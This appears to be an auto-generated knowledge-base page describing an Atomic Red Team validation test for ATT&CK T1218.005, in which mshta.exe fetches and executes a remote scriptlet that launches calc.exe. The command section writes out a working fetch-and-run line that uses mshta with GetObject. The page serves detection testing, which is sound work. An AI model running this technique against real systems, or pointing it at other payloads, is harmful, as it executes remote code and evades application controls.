---
atomic_guid: "1483fab9-4f52-4217-a9ce-daa9d7747cae"
title: "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.005"
attack_technique_name: "Signed Binary Proxy Execution: Mshta"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "1483fab9-4f52-4217-a9ce-daa9d7747cae"
  - "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject

Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.

## Metadata

- Atomic GUID: 1483fab9-4f52-4217-a9ce-daa9d7747cae
- Technique: T1218.005: Signed Binary Proxy Execution: Mshta
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1218.005/T1218.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.005]]

## Input Arguments

### file_url

- description: location of the payload
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct

## Executor

- name: command_prompt

### Command

```cmd
mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.yaml)
